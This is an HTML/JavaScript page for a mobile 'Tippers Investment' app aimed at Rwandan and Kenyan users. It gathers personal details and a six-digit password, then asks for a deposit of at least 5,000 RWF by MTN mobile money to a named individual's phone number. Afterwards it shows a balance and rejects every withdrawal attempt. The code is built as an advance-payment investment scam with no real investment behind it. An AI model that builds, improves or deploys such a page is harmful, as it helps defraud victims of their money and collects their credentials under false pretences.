<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Tippers Investment</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<!-- ICONS (Font Awesome) -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

<style>

body{
margin:0;
font-family:Segoe UI;
background:#0b1120;
display:flex;
justify-content:center;
align-items:center;
height:100vh;
}

/* APP */
.app{
width:380px;
background:#000;
border-radius:20px;
overflow:hidden;
color:white;
display:flex;
flex-direction:column;
}

/* CONTENT */
.content{
padding:20px;
height:520px;
overflow-y:auto;
animation:fade 0.4s ease;
}

/* ANIMATION */
@keyframes fade{
from{opacity:0; transform:translateY(10px);}
to{opacity:1; transform:translateY(0);}
}

.title{
color:#f59e0b;
text-align:center;
font-weight:bold;
}

.desc{
text-align:center;
margin-top:10px;
}

label{
margin-top:10px;
display:block;
}

/* INPUT */
input,select{
width:100%;
padding:10px;
margin-top:5px;
border-radius:8px;
border:none;
background:#0f172a;
color:white;
transition:0.3s;
}

input:focus{
outline:none;
box-shadow:0 0 5px #f59e0b;
}

/* BUTTON */
button{
width:100%;
padding:12px;
margin-top:15px;
border:none;
border-radius:10px;
background:#f59e0b;
font-weight:bold;
cursor:pointer;
transition:0.3s;
}

button:hover{
transform:scale(1.03);
background:#f97316;
}

/* ROW */
.row{
display:flex;
gap:5px;
}

/* NAVBAR */
.nav{
display:flex;
justify-content:space-around;
background:#020617;
padding:10px;
border-top:1px solid #111;
}

.nav div{
text-align:center;
cursor:pointer;
transition:0.3s;
}

.nav i{
font-size:20px;
display:block;
margin-bottom:3px;
}

.nav div:hover{
color:#f59e0b;
transform:scale(1.1);
}

/* TOAST */
#toast{
position:fixed;
bottom:20px;
left:50%;
transform:translateX(-50%);
background:black;
color:white;
padding:10px;
border-radius:8px;
display:none;
}

</style>
</head>

<body>

<div class="app">

<div class="content" id="screen"></div>

<!-- DASHBOARD NAV -->
<div class="nav" id="nav" style="display:none">
<div onclick="home()">
<i class="fa-solid fa-house"></i>
HOME
</div>

<div onclick="withdraw()">
<i class="fa-solid fa-money-bill-transfer"></i>
WITHDRAW
</div>
</div>

</div>

<div id="toast"></div>

<script>

const screen=document.getElementById("screen");
const nav=document.getElementById("nav");

let amount=0;
let paid=false;

/* TOAST */
function toast(msg){
let t=document.getElementById("toast");
t.innerText=msg;
t.style.display="block";
setTimeout(()=>t.style.display="none",2000);
}

/* START */
function start(){
nav.style.display="none";

screen.innerHTML=`
<h2 class="title">WELCOME TO TIPPERS INVESTMENT APP !</h2>
<p class="desc">Start now and grow your income smartly in tippers earning every time.</p>
<button onclick="register()">START</button>
`;
}

/* REGISTER */
function register(){
screen.innerHTML=`

<h3 class="title">REGISTER</h3>

<label>First Name</label>
<input id="f">

<label>Last Name</label>
<input id="l">

<label>Gender</label>
<select id="g">
<option value="">Select</option>
<option>Male</option>
<option>Female</option>
</select>

<label>Phone</label>
<div class="row">
<select id="code">
<option value="+250">RWA +250</option>
<option value="+254">KEN +254</option>
</select>
<input id="phone">
</div>

<label>Email</label>
<input id="email">

<label>Password</label>
<input id="pass">

<label>Confirm Password</label>
<input id="cpass">

<button onclick="doRegister()">REGISTER</button>
`;
}

/* REGISTER VALIDATION */
function doRegister(){

if(!f.value||!l.value||!g.value||!phone.value||!email.value||!pass.value||!cpass.value){
toast("Fill all fields ❌"); return;
}

if(!email.value.endsWith("@gmail.com")){
toast("Invalid email ❌"); return;
}

if(!/^[0-9]{6}$/.test(pass.value)){
toast("Password must be 6 digits ❌"); return;
}

if(pass.value!==cpass.value){
toast("Passwords not match ❌"); return;
}

login();
}

/* LOGIN */
function login(){
screen.innerHTML=`

<h3 class="title">Login to continue</h3>

<label>Email</label>
<input id="le">

<label>Password</label>
<input id="lp">

<div style="display:flex;justify-content:space-between">
<span style="color:#f59e0b">Forgot password</span>
<span onclick="register()" style="color:#f59e0b;cursor:pointer">Create account</span>
</div>

<button onclick="doLogin()">LOGIN</button>
`;
}

/* LOGIN */
function doLogin(){

if(!le.value||!lp.value){
toast("Fill all fields ❌"); return;
}

if(!/^[0-9]{6}$/.test(lp.value)){
toast("Invalid password ❌"); return;
}

deposit();
}

/* DEPOSIT */
function deposit(){
screen.innerHTML=`

<h3 class="title">DEPOSIT BALANCE</h3>
<p class="desc">Add funds using MTN mobile money</p>

<label>Amount</label>
<input id="amt">

<p>Minimum: 5,000 RWF</p>

<label>Sender Name</label>
<input id="sender">

<button onclick="goPayment()">CONTINUE</button>
`;
}

function goPayment(){

let a=parseInt(amt.value);

if(!a||a<5000||!sender.value){
toast("Invalid input ❌"); return;
}

amount=a;
payment();
}

/* PAYMENT */
function payment(){
screen.innerHTML=`

<h3 class="title">PAYMENT INFORMATION</h3>

<div style="background:#111;padding:10px;border-radius:10px">
0795410739<br><br>BARAKA BOLINGO
</div>

<button onclick="dial()">DIAL & PAY</button>
`;
}

/* DIAL */
function dial(){
screen.innerHTML=`

<div>*182*1*1*0795410739#</div>

<p class="desc">Upload proof of payment screenshot</p>

<input type="file" id="file">

<button onclick="submitProof()">SUBMIT</button>
`;
}

function submitProof(){

if(!file.value){
toast("Upload proof ❌"); return;
}

paid=true;
withdrawPeriod();
}

/* WITHDRAW PERIOD */
function withdrawPeriod(){
screen.innerHTML=`

<h3 class="title">WITHDRAW PERIOD</h3>

<select>
<option>1 Day</option>
<option>1 Week</option>
<option>1 Month</option>
<option>12 Months</option>
</select>

<button onclick="finish()">SEND & CONFIRM</button>
`;
}

function finish(){
screen.innerHTML=`<button onclick="dashboard()">CONFIRM</button>`;
}

/* DASHBOARD */
function dashboard(){
nav.style.display="flex";

screen.innerHTML=`
<h3 class="title">Balance: ${amount} RWF</h3>
<p class="desc">Wait until your withdraw schedule is reached.</p>
`;
}

/* HOME */
function home(){
toast("Wait until your schedule is reached.");
}

/* WITHDRAW */
function withdraw(){

if(!paid){
toast("Complete deposit first ❌"); return;
}

let w=prompt("Enter amount");

if(!w||w<7500){
toast("INVALID INPUT ❌"); return;
}

toast("You're not allowed to withdraw before the locked schedule.");
}

/* START */
start();

</script>

</body>
</html>
